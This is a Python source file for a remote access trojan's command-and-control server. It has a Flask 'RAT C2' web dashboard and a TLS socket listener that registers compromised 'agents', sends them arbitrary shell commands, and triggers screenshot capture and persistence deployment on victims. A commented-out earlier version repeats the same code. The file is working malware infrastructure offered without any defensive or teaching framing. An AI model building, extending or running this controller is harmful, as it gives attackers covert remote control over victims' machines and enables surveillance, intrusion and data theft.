#!/usr/bin/env python3
import os
import sys
import json
import ssl
import socket
import threading
import time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
clients = {}

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>RAT C2 Dashboard v2.1</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0c0f1d; color: #00ff66; padding: 20px; }
        .panel { background: #14192f; padding: 20px; border-radius: 8px; border: 1px solid #1f294d; margin-bottom: 20px; }
        h1, h3 { color: #00bfff; margin-top: 0; }
        .grid { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; }
        .client-item { background: #1f294d; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer; }
        .client-item:hover { background: #2a3768; }
        input[type="text"] { width: 70%; padding: 10px; background: #0c0f1d; border: 1px solid #1f294d; color: #00ff66; border-radius: 4px; }
        button { padding: 10px 20px; background: #00bfff; border: none; border-radius: 4px; color: #0c0f1d; font-weight: bold; cursor: pointer; }
        button:hover { background: #0099cc; }
        .output-box { background: #0c0f1d; padding: 15px; border-radius: 4px; min-height: 200px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; color: #ffffff; border: 1px solid #1f294d; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="panel">
        <h1>🎯 RAT C2 Core Administration Dashboard</h1>
        <p>Status: Monitoring synchronized production node links...</p>
    </div>

    <div class="grid">
        <div class="panel">
            <h3>📡 Discovered Agents</h3>
            <div id="clientList">Targeting registry systems...</div>
        </div>
        <div class="panel">
            <h3>💻 Console Orchestration</h3>
            <div id="activeTarget" style="color: #00bfff; font-weight: bold; margin-bottom: 10px;">Select an agent to interact</div>
            <input type="text" id="cmdInput" placeholder="Enter system shell command (e.g., whoami)...">
            <button onclick="queueCommand()">Execute</button>
            <br><br>
            <button onclick="triggerMacro('SCREENSHOT')" style="background: #ff9900;">📸 Capture Screenshot</button>
            <button onclick="triggerMacro('PERSISTENCE')" style="background: #cc33ff;">🔒 Deploy Persistence</button>
            <h4>Output Stream:</h4>
            <div class="output-box" id="outputConsole">Awaiting node validation...</div>
        </div>
    </div>

    <script>
        let selectedClient = null;

        function fetchClients() {
            fetch('/api/clients')
                .then(res => res.json())
                .then(data => {
                    let html = '';
                    let keys = Object.keys(data);
                    if(keys.length === 0) {
                        document.getElementById('clientList').innerHTML = 'No agents connected.';
                        return;
                    }
                    keys.forEach(id => {
                        html += `<div class="client-item" onclick="selectClient('${id}')">🔹 <b>${id}</b> (${data[id].ip})</div>`;
                    });
                    document.getElementById('clientList').innerHTML = html;
                });
        }

        function selectClient(id) {
            selectedClient = id;
            document.getElementById('activeTarget').innerText = `Active Target: ${id}`;
            checkOutput();
        }

        function queueCommand() {
            if(!selectedClient) { alert('Please select a target agent first.'); return; }
            let val = document.getElementById('cmdInput').value;
            if(!val) return;
            
            fetch('/api/execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ client_id: selectedClient, command: "CMD:" + val })
            });
            document.getElementById('cmdInput').value = '';
            document.getElementById('outputConsole').innerText = "Command queued. Executing...";
        }

        function triggerMacro(macroType) {
            if(!selectedClient) { alert('Please select a target agent first.'); return; }
            fetch('/api/execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ client_id: selectedClient, command: macroType })
            });
            document.getElementById('outputConsole').innerText = `${macroType} sent...`;
        }

        function checkOutput() {
            if(!selectedClient) return;
            fetch(`/api/output?client_id=${selectedClient}`)
                .then(res => res.json())
                .then(data => {
                    if(data.output) {
                        document.getElementById('outputConsole').innerText = data.output;
                    }
                });
        }

        setInterval(fetchClients, 2000);
        setInterval(checkOutput, 1000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/clients')
def api_get_clients():
    out = {}
    for cid, info in clients.items():
        if info["connected"]:
            out[cid] = {"ip": info["ip"]}
    return jsonify(out)

@app.route('/api/execute', methods=['POST'])
def api_queue_command():
    req = request.json
    cid = req.get("client_id")
    cmd = req.get("command")
    if cid in clients:
        clients[cid]["cmd_queue"].append(cmd)
        return jsonify({"status": "queued"})
    return jsonify({"error": "Unknown client"}), 400

@app.route('/api/output')
def api_get_output():
    cid = request.args.get("client_id")
    if cid in clients:
        return jsonify({"output": clients[cid]["responses"].get("last", "No output received yet.")})
    return jsonify({"error": "Unknown client"}), 400

def socket_orchestrator(host, port):
    if not os.path.exists('server.crt') or not os.path.exists('server.key'):
        os.system('openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost" 2>/dev/null')

    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.load_cert_chain('server.crt', 'server.key')

    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_sock.bind((host, port))
    raw_sock.listen(5)
    secure_server = ctx.wrap_socket(raw_sock, server_side=True)

    print(f"[+] Clean-Stream C2 Server online on port {port}")
    client_idx = 0

    while True:
        try:
            sock, addr = secure_server.accept()
            client_idx += 1
            cid = f"PC-{client_idx:04d}"
            
            clients[cid] = {
                "socket": sock,
                "ip": f"{addr[0]}:{addr[1]}",
                "connected": True,
                "cmd_queue": [],
                "responses": {}
            }
            print(f"[+] Secured connection: {cid}")
            threading.Thread(target=client_handler, args=(cid,), daemon=True).start()
        except Exception:
            pass

def client_handler(cid):
    info = clients[cid]
    sock = info["socket"]

    while info["connected"]:
        if info["cmd_queue"]:
            next_cmd = info["cmd_queue"].pop(0)
            try:
                sock.sendall(next_cmd.encode('utf-8') + b"\n")
                
                response_buffer = b""
                while True:
                    chunk = sock.recv(16384)
                    if not chunk:
                        info["connected"] = False
                        break
                    response_buffer += chunk
                    if b"__EOF__" in chunk:
                        break
                
                clean_res = response_buffer.replace(b"__EOF__", b"").decode('utf-8', errors='ignore')
                info["responses"]["last"] = clean_res
            except Exception:
                info["connected"] = False
                break
        else:
            time.sleep(0.1)

    sock.close()

if __name__ == "__main__":
    threading.Thread(target=socket_orchestrator, args=("0.0.0.0", 4443), daemon=True).start()
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)



# #!/usr/bin/env python3
# import os
# import sys
# import json
# import ssl
# import socket
# import threading
# import time
# from datetime import datetime
# from flask import Flask, render_template_string, request, jsonify

# app = Flask(__name__)

# # Core tracking dictionaries
# clients = {}
# # Structure: { client_id: { "socket": secure_sock, "ip": ip, "connected": True, "cmd_queue": [], "responses": {} } }

# DASHBOARD_HTML = """
# <!DOCTYPE html>
# <html>
# <head>
#     <title>RAT C2 Dashboard v2.0</title>
#     <meta charset="UTF-8">
#     <style>
#         body { font-family: monospace; background: #0c0f1d; color: #00ff66; padding: 20px; }
#         .panel { background: #14192f; padding: 20px; border-radius: 8px; border: 1px solid #1f294d; margin-bottom: 20px; }
#         h1, h3 { color: #00bfff; margin-top: 0; }
#         .grid { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; }
#         .client-item { background: #1f294d; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer; }
#         .client-item:hover { background: #2a3768; }
#         input[type="text"] { width: 70%; padding: 10px; background: #0c0f1d; border: 1px solid #1f294d; color: #00ff66; border-radius: 4px; }
#         button { padding: 10px 20px; background: #00bfff; border: none; border-radius: 4px; color: #0c0f1d; font-weight: bold; cursor: pointer; }
#         button:hover { background: #0099cc; }
#         .output-box { background: #0c0f1d; padding: 15px; border-radius: 4px; min-height: 200px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; color: #ffffff; border: 1px solid #1f294d; margin-top: 10px; }
#     </style>
# </head>
# <body>
#     <div class="panel">
#         <h1>🎯 RAT C2 Core Administration Dashboard</h1>
#         <p>Status: Listening for incoming node beacons encrypted over TLS channels...</p>
#     </div>

#     <div class="grid">
#         <div class="panel">
#             <h3>📡 Discovered Agents</h3>
#             <div id="clientList">Targeting registry systems...</div>
#         </div>
#         <div class="panel">
#             <h3>💻 Console Orchestration</h3>
#             <div id="activeTarget" style="color: #00bfff; font-weight: bold; margin-bottom: 10px;">Select an agent to interact</div>
#             <input type="text" id="cmdInput" placeholder="Enter system shell command (e.g., whoami)...">
#             <button onclick="queueCommand()">Execute</button>
#             <br><br>
#             <button onclick="triggerMacro('SCREENSHOT')" style="background: #ff9900;">📸 Capture Screenshot</button>
#             <button onclick="triggerMacro('PERSISTENCE')" style="background: #cc33ff;">🔒 Deploy Persistence</button>
#             <h4>Output Stream:</h4>
#             <div class="output-box" id="outputConsole">Awaiting node validation...</div>
#         </div>
#     </div>

#     <script>
#         let selectedClient = null;

#         function fetchClients() {
#             fetch('/api/clients')
#                 .then(res => res.json())
#                 .then(data => {
#                     let html = '';
#                     let keys = Object.keys(data);
#                     if(keys.length === 0) {
#                         document.getElementById('clientList').innerHTML = 'No agents connected.';
#                         return;
#                     }
#                     keys.forEach(id => {
#                         html += `<div class="client-item" onclick="selectClient('${id}')">🔹 <b>${id}</b> (${data[id].ip})</div>`;
#                     });
#                     document.getElementById('clientList').innerHTML = html;
#                 });
#         }

#         function selectClient(id) {
#             selectedClient = id;
#             document.getElementById('activeTarget').innerText = `Active Target: ${id}`;
#             checkOutput();
#         }

#         function queueCommand() {
#             if(!selectedClient) { alert('Please select a target agent first.'); return; }
#             let val = document.getElementById('cmdInput').value;
#             if(!val) return;
            
#             fetch('/api/execute', {
#                 method: 'POST',
#                 headers: {'Content-Type': 'application/json'},
#                 body: JSON.stringify({ client_id: selectedClient, command: "CMD:" + val })
#             });
#             document.getElementById('cmdInput').value = '';
#             document.getElementById('outputConsole').innerText = "Command queued. Waiting for agent execution loop match...";
#         }

#         function triggerMacro(macroType) {
#             if(!selectedClient) { alert('Please select a target agent first.'); return; }
#             fetch('/api/execute', {
#                 method: 'POST',
#                 headers: {'Content-Type': 'application/json'},
#                 body: JSON.stringify({ client_id: selectedClient, command: macroType })
#             });
#             document.getElementById('outputConsole').innerText = `${macroType} requested. Processing buffer layers...`;
#         }

#         function checkOutput() {
#             if(!selectedClient) return;
#             fetch(`/api/output?client_id=${selectedClient}`)
#                 .then(res => res.json())
#                 .then(data => {
#                     if(data.output) {
#                         document.getElementById('outputConsole').innerText = data.output;
#                     }
#                 });
#         }

#         setInterval(fetchClients, 2000);
#         setInterval(checkOutput, 1000);
#     </script>
# </body>
# </html>
# """

# @app.route('/')
# def index():
#     return render_template_string(DASHBOARD_HTML)

# @app.route('/api/clients')
# def api_get_clients():
#     out = {}
#     for cid, info in clients.items():
#         if info["connected"]:
#             out[cid] = {"ip": info["ip"]}
#     return jsonify(out)

# @app.route('/api/execute', methods=['POST'])
# def api_queue_command():
#     req = request.json
#     cid = req.get("client_id")
#     cmd = req.get("command")
#     if cid in clients:
#         clients[cid]["cmd_queue"].append(cmd)
#         return jsonify({"status": "queued"})
#     return jsonify({"error": "Unknown client"}), 400

# @app.route('/api/output')
# def api_get_output():
#     cid = request.args.get("client_id")
#     if cid in clients:
#         return jsonify({"output": clients[cid]["responses"].get("last", "No output received yet.")})
#     return jsonify({"error": "Unknown client"}), 400

# def socket_orchestrator(host, port):
#     # Generate certs if missing
#     if not os.path.exists('server.crt') or not os.path.exists('server.key'):
#         print("[*] Generating modern self-signed TLS keys...")
#         os.system('openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost" 2>/dev/null')

#     ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
#     ctx.load_cert_chain('server.crt', 'server.key')

#     raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#     raw_sock.bind((host, port))
#     raw_sock.listen(5)
#     secure_server = ctx.wrap_socket(raw_sock, server_side=True)

#     print(f"[+] TLS C2 Socket listener firmly bound to port {port}")
#     client_idx = 0

#     while True:
#         try:
#             sock, addr = secure_server.accept()
#             client_idx += 1
#             cid = f"PC-{client_idx:04d}"
            
#             clients[cid] = {
#                 "socket": sock,
#                 "ip": f"{addr[0]}:{addr[1]}",
#                 "connected": True,
#                 "cmd_queue": [],
#                 "responses": {}
#             }
#             print(f"\n[+] Secured connection registered: {cid} from {addr[0]}")
            
#             # Spawn isolated client handling pipeline thread
#             threading.Thread(target=client_handler, args=(cid,), daemon=True).start()
#         except Exception as e:
#             print(f"[-] Listening loop error: {e}")

# def client_handler(cid):
#     info = clients[cid]
#     sock = info["socket"]
#     sock.settimeout(1.0) # Break block frequently to check for new queued commands

#     while info["connected"]:
#         # 1. Check if the web panel queued up a command to push down the wire
#         if info["cmd_queue"]:
#             next_cmd = info["cmd_queue"].pop(0)
#             try:
#                 sock.sendall(next_cmd.encode('utf-8') + b"\n")
                
#                 # 2. Synchronously read the specific result packet back right after sending
#                 # Loop reading until transmission markers finish if response spans frames
#                 response_buffer = b""
#                 while True:
#                     try:
#                         chunk = sock.recv(16384)
#                         if not chunk:
#                             info["connected"] = False
#                             break
#                         response_buffer += chunk
#                         if b"__EOF__" in chunk:
#                             break
#                     except socket.timeout:
#                         continue
                
#                 clean_res = response_buffer.replace(b"__EOF__", b"").decode('utf-8', errors='ignore')
#                 info["responses"]["last"] = clean_res
#             except Exception as e:
#                 print(f"[-] Core pipeline exception for {cid}: {e}")
#                 info["connected"] = False
#                 break
#         else:
#             # Idle sleep to keep CPU consumption low when no commands are active
#             time.sleep(0.2)
#             # Send a micro-ping to verify socket status
#             try:
#                 sock.sendall(b"PING\n")
#                 # Flush the matching pong reply cleanly out of the tracking buffer
#                 sock.recv(1024)
#             except socket.timeout:
#                 continue
#             except Exception:
#                 info["connected"] = False

#     sock.close()
#     print(f"[-] Client connection terminated: {cid}")

# if __name__ == "__main__":
#     # Start background TLS C2 Engine
#     threading.Thread(target=socket_orchestrator, args=("0.0.0.0", 4443), daemon=True).start()
#     # Launch main thread Flask app
#     app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
